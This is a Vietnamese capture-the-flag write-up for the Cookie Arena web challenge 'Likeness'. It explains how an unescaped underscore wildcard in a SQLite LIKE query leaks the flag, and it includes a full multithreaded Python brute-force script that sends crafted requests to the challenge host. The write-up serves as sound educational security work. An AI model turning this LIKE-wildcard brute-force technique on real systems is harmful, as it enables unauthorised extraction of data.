# Web-Likeness

<br>

Chào anh chị em, hôm nay được sự đồng ý và cổ vũ nhiệt tình từ đàn anh **[Cookie hân hoan](https://www.facebook.com/cookie.han.hoan)**, mình sẽ viết writeup về challenge web - [Likeness](https://battle.cookiearena.org/challenges/web/likeness)

Cùng lướt qua danh sách phần mềm mà mình sử dụng:

1. [Wireshark](https://www.wireshark.org/)
2. [Visual Code](https://code.visualstudio.com/)

Kiến thức mà mình dùng để đạt được mục đích:

1. [SQL](https://www.w3schools.com/sql/default.asp)
2. [Brute force](https://en.wikipedia.org/wiki/Brute-force_attack)
3. [HTTP protocol](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
4. [Python language](https://www.w3schools.com/python/)

---

## Nào cùng phân tích

Đầu tiên mình sẽ ghé thăm đối tượng
![Imgur](https://i.imgur.com/4JXBdwf.png)
_hình 1: Giao diện của đối tượng_

Ở đây, chúng ta được cung cấp những thông tin như xem code ở **/source**, Flag nằm ở mục **lastname của DB**; và đặc biệt cấu trúc của cờ là **CHH{...}**. Mình sẽ ghi chú nó lại.

<br>

Sau đó, mình tải/mở xem code tại route _/source_

Nào cũng nhau phân tích code nhé
![Imgur](https://i.imgur.com/BFVrv9q.png)
_hình 2: thư viện mà máy chủ sử dụng_

Ở hình 2 ta thấy máy chủ sử dụng cơ sở dữ liệu SQLite và chạy trên nền tảng Flask.

![Imgur](https://i.imgur.com/eGqXCyB.png)
_hình 3: code tại if \_\_name\_\_ == "\_\_main\_\_"_

Khi máy chủ hoạt động ta thấy rằng nó sẽ:

-   Sinh ra một file cơ sở dữ liệu mới có tên là "users.db" được thể hiện ở [dòng 43](https://i.imgur.com/RTJxb8X.png)
-   Tại [dòng 45-47](https://i.imgur.com/TPQqKQN.png) cursor thực thi tạo ra một table là _authors_ có các fields như first, middle và **last**;
-   Cursor cũng tiến hành thêm dữ liệu cho bảng trên ([dòng 48-61](https://i.imgur.com/XbUCxSy.png)), ngay tại dòng 60 thì ta sẽ thấy mục tiêu cần đạt được thêm ở cột **last** với first và middle lần lượt là "Psedonymous" và "Unpuzzler7"

Suy ra mục tiêu có thể được chinh phục với [SQL Injection](https://en.wikipedia.org/wiki/SQL_injection).

Tuy nhiên, mình cần thêm nhiều thông tin hơn cho cuộc tấn công, nào quan sát quá trình hoạt động khi server nhận được các request từ client qua các **routes** do lập trình viên tạo ra
![Imgur](https://i.imgur.com/sibWo0d.png)
_hình 4: Các routes do lập trình viên thiết lập_

Qua hình 4 ta thấy rằng lập trình viên tạo ra 2 tuyến

-   Tuyến "/"
-   Tuyến "/source"

Đi sâu vào tuyến "/".
![Imgur](https://i.imgur.com/zfc0Kyw.png)
_hình 5: Tuyến " / "_

Ố ồ bạn thấy 27-28 chứ. Chúng ta sẽ không tấn công SQL Injection kiểu '1 or 1 = 1-- bởi vì đó chính là **"Placeholders"**.

Vào cái mùa ra đường nắng bể đầu ở Sài Gòn thì dòng lệnh 28

```python
request.args['lastname'].replace('%', '')
```

đã tiếp cho mình 3.14 cây que kem ốc quế. Bởi vì dòng code này đang chứng minh rằng chúng quên thay thế ký tự underscore(\_)

Thêm một đặt điểm mà chúng ta cần lưu ý đó là:<br>
![Imgur](https://i.imgur.com/AIEC1aP.png)
Ý nghĩa: giới hạn lượng truy cập đối với route " / " là 5 lượt trên 1 giây.

---

### Phân tích đối tượng với wireshark:

Mình sẽ tìm địa chỉ IPv4 của máy chủ với

```cli
>>> from socket import gethostbyname
>>> gethostbyname('likeness-838c833a.dailycookie.cloud')
'103.97.125.53'
```

Ngay sau đó mình kiểm tra các gói tin HTTP với host là **_103.97.125.53_** với wireshark để xem xét sự khác biệt nhằm đưa ra giải pháp/phương pháp truy tìm câu truy vấn tốt nhất.

Thông qua quá trình kiểm tra ba gói tin khi truy cập trang web (hình 7), nhập ký tự bất kỳ (hình 8) và 5 dấu underscore (hình 9).
![Imgur](https://i.imgur.com/QfbEpaf.png)
_hình 6_

![Imgur](https://i.imgur.com/7nlWUp5.png)
_hình 7_

![Imgur](https://i.imgur.com/wJoTrEI.png)
_hình 8_

Qua 3 hình trên ta thấy đặc điểm dễ nhận biết nhất là sự khác biệt trong gói tin (text/html) nhận được, đó là có thẻ table và h2 với nội dung **Search Results.**.

Đồng thời thông qua wireshark mình phát hiện máy chủ hoạt động trên cổng 80 (http)

![Imgur](https://i.imgur.com/lvq96qc.png)
_hình 9_

Như vậy, sau khi chúng ta phân tích xong thì thu được các kết quả như sau:
1. Máy chủ:
- IPv4: 103.97.125.53
- Host: likeness-838c833a.dailycookie.cloud
- Port: 80
2. Phương pháp khai thác
- SQL Injection với underscore
- Brute force
---

### Viết POC:

Mình sẽ tạo ra một file config.json

```json
{
    "host": "likeness-838c833a.dailycookie.cloud",
    "port": 80,
    "methods": "GET",
    "url": "/?lastname=%s",
    "version": "HTTP/1.1",
    "header": {
        "Host": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "Accept-Language: en-US,en;q=0.6",
        "Connection": "keep-alive"
    },
    "buffer": 2048
}
```

Ngay sau đó sẽ code chứng mình rằng phương pháp của mình là chính xác.

```python
import socket
import json
import argparse
from time import sleep
import threading, queue

args = argparse.ArgumentParser()
args.add_argument('--config', '-c', default='config.json')
args.add_argument('--thread', '-t', type=int, default=5)
args.add_argument('--begin', '-b', type=int, default=1)
args.add_argument('--end', '-e', type=int, default=1000000)

args = args.parse_args()

config = json.load(open(args.config))
host = socket.gethostbyname(config.get('host', '0.0.0.0'))
port = config.get('port', 80)
url = config.get('url', "/")
method = config.get('method', 'GET')
version = config.get('version', 'HTTP/1.1')
header = config.get('header', {})
header['Host'] = config.get('host', f'0.0.0.0:{port}')
buffer = config.get('buffer', 1024)

dict2raw = lambda x: '\r\n'.join([f'{k}:{x[k]}' for k in x])+'\r\n'*2
payload = lambda n : f"CHH\x7b{'_'*n}\x7d"
check = lambda res : res.decode().count('\x53\x65\x61\x72\x63\x68\x20\x52\x65\x73\x75\x6c\x74\x73\x3a')

__tmpq = queue.Queue()
__step = (args.end - args.begin + 1) // args.thread
all_t = []

def main(a, b, q:queue.Queue):
    print(f"Start find the target from {a} to {b}")
    for i in range(a, b + 1):
        if not q.empty():
            print(f"{a} >> {b}: Turn off successful")
            return
        __sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        __sock.connect((host, port))
        __sock.send(f'{method} {url%(payload(i))} {version}\r\n{dict2raw(header)}'.encode())
        __recv = b''
        data = __sock.recv(buffer)
        while True:
            __recv += data
            if len(data) != buffer: break
            data = __sock.recv(buffer)
        if check(__recv):
            q.put(payload(i))
            print(f"{a} >> {b}: Explore a suitable query to showcase SQL Injection attack")
            return
        __sock.close()
        sleep(1)
    print(f"{a} >> {b}: No results found!")
    return

for i in range(args.begin, args.end, __step):
    all_t.append(threading.Thread(
        target = main,
        args=(
            i,
            min(args.end, i + __step - 1),
            __tmpq
        )
    ))
    all_t[-1].start()

while __tmpq.empty():
    if len(all_t):
        all_t = list(filter(lambda i: i.is_alive(), all_t))
    else:
        print("No results found!")
        exit(1)
else: print(">> Turn off all threads")

while len(all_t): all_t = list(filter(lambda i: i.is_alive(), all_t))

print(f"Good query >> {__tmpq.get()}")
```

---

## Chạy POC:

```terminal
> python run.py --begin 1 --end 200
```

Kết quả:
![Imgur](https://i.imgur.com/0J4dr2H.png)

Rồi copy và dán lên tìm thôi:
![Imgur](https://i.imgur.com/x3AYv2J.png)

Tada vậy là mình đã chinh phục thành công. :partying_face: :partying_face: :partying_face:


## Kết bài:
Chân thành cảm ơn người anh **[Cookie hân hoan](https://www.facebook.com/cookie.han.hoan)** đã tạo ra sân chơi CTF đầy thú vị với nhiều dạng challenge để mọi người cũng nghiên cứu và try hard. Bản thân mình thì học tập được rất nhiều điều từ các challenge, và mình sẽ có gắng viết những writeup challenge khác hay hơn nữa. Nếu có góp ý và thắc mắc xin hãy thả thơ vào comment :smiling_face_with_three_hearts: 

Chúc mọi người một ngày try hard thành công
